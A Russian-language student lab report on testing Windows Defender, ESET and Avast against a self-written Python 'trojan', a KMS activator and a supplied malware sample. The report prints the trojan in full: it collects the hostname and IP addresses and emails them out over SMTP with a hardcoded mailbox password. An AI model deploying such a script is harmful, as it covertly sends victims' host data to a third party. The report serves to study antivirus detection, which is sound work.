\section{Цель работы}
Цель: изучение и приобретение навыков работы с антивирусным программным обеспечением. 

Задачи:
\begin{itemize}
    \item Конфигурирование антивирусного средства;
    \item Лечение заведомо зараженных вредоносных программ.
\end{itemize}


\section{Ход работы}
\subsection{Подготовка виртуальной машины}
Для работы с вредоносным ПО подготовим виртуальную машину. Установим антивирус \textbf{ESET Nod32} и \textbf{Avast}. \textbf{Защитник Windows} уже установлен (Рисунки 1-4).

\image{11.png}{Защитник Windows}{1}
\image{12.png}{Eset}{1}
\image{13.png}{Avast}{1}
\FloatBarrier
\clearpage

\subsection{Подготовка вредоносного ПО}
\subsubsection{Свой скрипт на Python}
Напишем свой скрипт на \texttt{Python}, реализующий простейшую атаку: получение ip-адреса компьютера и отправление их по почте злоумышленнику. Подобный скрипт описан на портале \url{https://spy-soft.net/malware-rat-python/}.

Код программы приведён в листинге ниже:

\begin{lstlisting}[language={python}, caption={Вирус}, numbers=none, lineskip={0pt}]
import smtplib as smtp
import socket
import urllib.request

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

public_ip = urllib.request.urlopen("http://ident.me").read().decode("utf8")

email = "shadrunovas@yandex.ru"
password = "ahnvoheyesskboag"
dest_email = "shadrunovas@gmail.com"
subject = "IP"
email_text = f"Host: {hostname}\nLocal IP: {local_ip}\nPublic IP: {public_ip}"
message = "From: {}\nTo: {}\nSubject: {}\n\n{}".format(
    email, dest_email, subject, email_text
)
server = smtp.SMTP_SSL("smtp.yandex.com")

server.ehlo(email)
server.login(email, password)
server.auth_plain()
server.sendmail(email, dest_email, message)
server.quit()
\end{lstlisting}

Далее необходимо собрать из скрипта исполняемый файл \textbf{.exe} для успешного детектирования антивирусами. Для этого используем модуль \textbf{pyinstaller} \linebreak (Рисунок 4):

\image{21.png}{Установка pyinstaller}{1}
\FloatBarrier

Проверим работу скрипта (Рисунок 5-6):

\image{22.png}{Запуск исполняемого файла}{1}
\image{23.png}{Полученное письмо}{0.6}
\FloatBarrier


\subsubsection{Проверка скрипта в антивирусах}

Сначала проверим работу \textbf{Защитника Windows}. Защитник Windows ничего не обнаружил (Рисунки 7-8). Скорее всего, влияют старые базы сигнатур, однако этот антивирус никогда не отличался выдающимися результатами.

\image{31.png}{Защитник Windows}{1}
\image{32.png}{Защитник Windows}{1}
\FloatBarrier

Теперь проверим продукт от \textbf{Eset}. Антивирус ничего не обнаружил (Рисунок 9). В данном случае базы также устаревшие.

\image{33.png}{Eset}{1}
\FloatBarrier

Последний антивирус от \textbf{Avast} справился хорошо и определил вредоносное ПО — троян (Рисунки 10-11). В данном случае базы свежие.

\image{34.png}{Выбор области сканирования}{1}
\image{35.png}{Avast}{1}
\FloatBarrier

В завершение, загрузим файл \texttt{virus.exe} в \textbf{Virustotal}. Этот ресурс позволяет просканировать файл движками многих производителей. В результате получаем, что пять антивирусов зафиксировали вредоносную активность, в том числе \textbf{Avast} (Рисунок 12).

\image{36.png}{Virustotal}{1}
\FloatBarrier
\clearpage

\subsection{KMS Activator}
Таким же образом проверим \textbf{kms activator} — утилиту, позволяющую активировать продукты компании Microsoft. 

Сначала проверим работу \textbf{Защитника Windows}. Защитник Windows снова ничего не обнаружил (Рисунки 13-14).

\image{41.png}{Защитник Windows}{1}
\image{42.png}{Защитник Windows}{1}
\FloatBarrier

Теперь проверим продукт от \textbf{Eset}. Антивирус ничего не обнаружил (Рисунок 15).

\image{43.png}{Eset}{1}
\FloatBarrier

\textbf{Avast} даже не пришлось запускать, как только архив с активатором был распакован, антивирус сразу же обнаружил нелегальное ПО (Рисунок 16). Активатор относится к категории \texttt{Win32:PUP-gen} — potentially unwanted program.

\image{44.png}{Avast}{1}
\FloatBarrier
\clearpage


\subsection{Предоставленный вирус}
Таким же образом проверим вирус из архива — \texttt{mb4040777.exe}. 

Сначала проверим работу \textbf{Защитника Windows}. Защитник Windows снова ничего не обнаружил (Рисунки 17-18).

\image{51.png}{Защитник Windows}{1}
\image{52.png}{Защитник Windows}{1}
\FloatBarrier

Теперь проверим продукт от \textbf{Eset}. В данном случае антивирус обнаружил вредоносное ПО и удалил файл, содержащий тело вируса (Рисунок 19).

\image{53.png}{Eset}{1}
\FloatBarrier

\textbf{Avast} также определил вирус (Рисунок 20).

\image{54.png}{Avast}{1}
\FloatBarrier
\clearpage

\section{Выводы о проделанной работе}
Я изучил и приобрёл навыки работы с антивирусным программным обеспечением различных вендоров (Microsoft, ESET, Avast), смог просканировать различные вредоносные файлы этими антивирусами, а также написал простейший троян с помощью Python. 

\clearpage